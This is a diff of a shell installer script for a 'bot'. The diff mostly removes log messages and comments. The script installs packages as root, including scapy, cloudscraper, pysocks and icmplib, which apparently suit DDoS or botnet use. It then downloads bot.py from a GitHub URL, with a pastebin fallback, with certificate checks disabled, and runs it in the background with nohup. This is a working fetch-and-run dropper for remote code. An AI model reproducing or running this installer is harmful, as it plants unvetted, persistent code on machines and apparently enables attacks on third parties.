@@ -41,7 +41,7 @@ PM_INSTALL=""
 if [ -r /etc/os-release ]; then
     . /etc/os-release
     case "$ID" in
-        ubuntu|debian|raspbian)
+        ubuntu|debian|raspbian) 
             PM_UPDATE="apt-get update -qq"
             PM_INSTALL="apt-get install -y"
             ;;
@@ -103,8 +103,8 @@ find_python() {
     for cmd in python3 python3.12 python3.11 python3.10 python3.9 python3.8 python3.7 python3.6 python; do
         if command -v "$cmd" >/dev/null 2>&1; then
             ver=$("$cmd" -c 'import sys; print(sys.version_info[:2])' 2>/dev/null)
-            major=$(echo "$ver" | awk -F',' '{print $1}' | tr -d ' ()') # Quoted var
-            minor=$(echo "$ver" | awk -F',' '{print $2}' | tr -d ' )') # Quoted var
+            major=$(echo $ver | awk -F',' '{print $1}' | tr -d ' ()')
+            minor=$(echo $ver | awk -F',' '{print $2}' | tr -d ' )')
             if [ "$major" -ge 3 ] && [ "$minor" -ge 6 ]; then
                 PYTHON_CMD="$cmd"
                 return 0
@@ -124,16 +124,8 @@ install_deps() {
         log "No known package manager; skipping automatic install"
         return 1
     fi
-    log "Attempting package manager update..."
     [ -n "$PM_UPDATE" ] && run_as_root sh -c "$PM_UPDATE" || true
-    log "Attempting package manager install for Python3 and essentials..."
-    run_as_root sh -c "$PM_INSTALL python3 python3-pip curl wget || true" # Added curl, wget
-    # Add specific package manager installs for libraries if necessary (e.g., libpcap for scapy on Debian/Ubuntu)
-    if check_cmd apt-get || check_cmd apt; then
-         run_as_root sh -c "$PM_INSTALL libpcap-dev || true"
-    elif check_cmd apk; then
-         run_as_root sh -c "$PM_INSTALL libpcap-dev || true" # Alpine uses libpcap-dev
-    fi
+    run_as_root sh -c "$PM_INSTALL python3 python3-pip curl wget || true"
 }
 
 # Try to find Python, then install if missing
@@ -143,14 +135,10 @@ find_python || { log "Still no suitable Python; attempting pyenv installer..."; 
 # Try installing Python via pyenv if still missing
 if [ -z "$PYTHON_CMD" ] && ( is_root || [ -n "$USE_SUDO" ] ); then
     if command -v curl >/dev/null 2>&1; then
-        log "Attempting Python install via pyenv..."
         curl -sLf https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | sh || true
         export PATH="$HOME/.pyenv/bin:$PATH"
         if command -v pyenv >/dev/null 2>&1; then
-            # Prefer 3.9, fallback to 3.8, then 3.7
-            pyenv install -s 3.9.0 || pyenv install -s 3.8.0 || pyenv install -s 3.7.0 || log "pyenv Python install failed"
-            # Activate the latest installed version
-            pyenv global $(pyenv versions --bare | grep '3' | head -n1) 2>/dev/null || true
+            pyenv install -s 3.9.0 || pyenv install -s 3.8.0 || pyenv install -s 3.7.0 || true
             PYTHON_CMD="$HOME/.pyenv/shims/python"
         fi
     fi
@@ -165,8 +153,7 @@ if "$PYTHON_CMD" -m venv env 2>/dev/null; then
     # shellcheck source=/dev/null
     . env/bin/activate 2>/dev/null || true
     log "Virtual environment created and activated."
-elif "$PYTHON_CMD" -m virtualenv env 2>/dev/null; then # Try virtualenv if venv fails
-    # shellcheck source=/dev/null
+elif "$PYTHON_CMD" -m virtualenv env 2>/dev/null; then
     . env/bin/activate 2>/dev/null || true
     log "virtualenv created and activated."
 else
@@ -182,64 +169,41 @@ else
     PIP_CMD="$PYTHON_CMD -m pip"
 fi
 $PIP_CMD install --upgrade pip setuptools wheel 2>/dev/null || true
-log "Pip is ready."
 
 # Install Python packages required by bot
-# Added cloudscraper, pysocks, icmplib, pywin32 (conditional)
-log "Installing Python dependencies..."
-PYTHON_DEPS="cloudscraper requests pysocks scapy icmplib"
-if [ "$(uname)" = "Linux" ]; then
-    # On Linux, pywin32 is not needed/available via pip
-    $PIP_CMD install $PYTHON_DEPS 2>/dev/null || $PIP_CMD install --user $PYTHON_DEPS || log "Failed to install python dependencies via pip"
-elif [ "$(uname)" = "Darwin" ]; then # macOS
-     # On macOS, pywin32 is not needed/available via pip
-     $PIP_CMD install $PYTHON_DEPS 2>/dev/null || $PIP_CMD install --user $PYTHON_DEPS || log "Failed to install python dependencies via pip"
-elif [ "$(uname)" = "CYGWIN" ] || [ "$(uname)" = "MINGW" ] || [ "$(uname)" = "MSYS" ]; then # Windows (Git Bash/Cygwin/MSYS)
-     # Install pywin32 on Windows-like environments
-     $PIP_CMD install $PYTHON_DEPS pywin32 2>/dev/null || $PIP_CMD install --user $PYTHON_DEPS pywin32 || log "Failed to install python dependencies via pip"
-else # Generic/Other
-     # Try installing with pywin32, might fail on non-Windows but doesn't hurt much
-     $PIP_CMD install $PYTHON_DEPS pywin32 2>/dev/null || $PIP_CMD install --user $PYTHON_DEPS pywin32 || log "Failed to install python dependencies via pip"
-fi
+$PIP_CMD install cloudscraper requests pysocks scapy icmplib 2>/dev/null || true
 
-
-# Download utility with fallbacks (kept as is, useful for bot download)
+# Download utility with fallbacks
 download_file() {
     url="$1"; dest="$2"
-    log "Attempting to download $url to $dest"
     if command -v wget >/dev/null 2>&1; then
-        wget -q --no-check-certificate "$url" -O "$dest" && log "Downloaded using wget" && return 0
+        wget -q --no-check-certificate "$url" -O "$dest" && return 0
     fi
     if command -v curl >/dev/null 2>&1; then
-        curl -sSL --insecure "$url" -o "$dest" && log "Downloaded using curl" && return 0
+        curl -sSL --insecure "$url" -o "$dest" && return 0
     fi
     if command -v fetch >/dev/null 2>&1; then
-        fetch -q -o "$dest" "$url" && log "Downloaded using fetch" && return 0
+        fetch -q -o "$dest" "$url" && return 0
     fi
     if command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
-        busybox wget -q -O "$dest" "$url" && log "Downloaded using busybox wget" && return 0
+        busybox wget -q -O "$dest" "$url" && return 0
     fi
     # Python fallback
     if command -v "$PYTHON_CMD" >/dev/null 2>&1; then
-        log "Attempting download using Python..."
         "$PYTHON_CMD" - <<EOF
 import sys, urllib.request
 try:
     urllib.request.urlretrieve("$url", "$dest")
-    sys.exit(0)
 except Exception as e:
-    sys.stderr.write(f"Python download failed: {e}\n")
     sys.exit(1)
 EOF
-        [ $? -eq 0 ] && log "Downloaded using Python" && return 0
+        [ $? -eq 0 ] && return 0
     fi
-    log "No download tool found."
     return 1
 }
 
 # Download the bot.py script
 BOT_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py"
-log "Downloading bot.py..."
 download_file "$BOT_URL" "bot.py" \
     || { log "Primary download failed, trying fallback URL"; BOT_URL="https://pastebin.com/raw/CQiRTJy0"; download_file "$BOT_URL" "bot.py"; } \
     || { log "All downloads failed"; exit 1; }
@@ -247,16 +211,13 @@ download_file "$BOT_URL" "bot.py" \
 chmod +x bot.py 2>/dev/null || true
 # Convert DOS newlines if needed
 if command -v dos2unix >/dev/null 2>&1; then
-    log "Converting newlines using dos2unix..."
     dos2unix bot.py 2>/dev/null || true
 else
-    log "Converting newlines using tr..."
     tr -d '\r' < bot.py > bot.tmp && mv bot.tmp bot.py 2>/dev/null || true
 fi
 
 log "Starting bot in background..."
 # Start bot in background, redirect output to log
-# Use the determined PYTHON_CMD to ensure it runs with the correct interpreter
 if command -v nohup >/dev/null 2>&1; then
     nohup "$PYTHON_CMD" bot.py > bot.log 2>&1 &
 elif command -v setsid >/dev/null 2>&1; then
@@ -272,6 +233,5 @@ if ps ax 2>/dev/null | grep -v grep | grep "[b]ot.py" >/dev/null; then
     echo "Installation completed successfully!"
 else
     log "Bot may have failed to start. You can try: cd $WORK_DIR && $PYTHON_CMD bot.py"
-    log "Check $WORK_DIR/bot.log for errors."
     exit 1
 fi
